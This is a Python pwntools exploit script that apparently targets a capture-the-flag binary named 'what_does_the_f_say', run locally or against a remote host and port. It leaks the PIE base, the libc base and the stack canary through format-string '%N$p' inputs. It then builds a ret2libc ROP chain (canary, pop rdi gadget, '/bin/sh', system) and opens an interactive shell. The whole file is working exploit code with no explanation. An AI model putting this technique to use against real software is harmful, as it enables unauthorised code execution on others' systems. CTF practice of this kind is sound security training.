from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './what_does_the_f_say_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def pie_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def libc_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def canary_leak(offset):
    sh.sendline(b'1')
    sh.sendline(b'2')
    sh.sendline('%{}$p'.format(offset))
    sh.recvuntil(b'Kryptonite?\n')
    get = sh.recvline().strip()
    get = int(get, 16)
    return get

def spend_rocks():
    sh.sendline(b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'1')

def get_inside_vuln():
    sh.sendlineafter(b'food',b'1')
    sh.sendline(b'2')
    sh.sendline(b'aa')

sh = start()
# pause()

leak_pie = pie_leak(15)
info(f'LEAKED PIE BASE: {hex(leak_pie)}')
elf.address = leak_pie - 0x174a
success(f'PIE_BASE --> {hex(elf.address)}')

libc_addr = libc_leak(25)
info(f'LIBC --> {hex(libc_addr)}')
libc.address = libc_addr - 0x21b97
success(f'LIBC_BASE --> {hex(libc.address)}')

# canary = canary_leak(23)
canary = canary_leak(13)
success(f'CANARY --> {hex(canary)}')

'''
pwndbg> x/i 0x7fbbef13d18a
   0x7fbbef13d18a <__libc_start_call_main+122>: mov    edi,eax
pwndbg> x/gw 0x7fbbef13d18a
0x7fbbef13d18a <__libc_start_call_main+122>:    0xffe8c789
pwndbg>s
'''

rop = ROP(elf)
rdi = rop.find_gadget(['pop rdi', 'ret']).address
success(f'RDI GADGET --> {hex(rdi)}')

ret = rop.find_gadget(['ret']).address
success(f'RET GADGET --> {hex(ret)}')

spend_rocks()

p = flat([
    asm('nop') * 0x18,
    canary,
    asm('nop') * 0x8,
    ret,
    rdi,
    next(libc.search(b'/bin/sh')),
    # ret,
    libc.sym['system']
])

get_inside_vuln()

sh.sendlineafter(b'?', p)
sh.interactive()
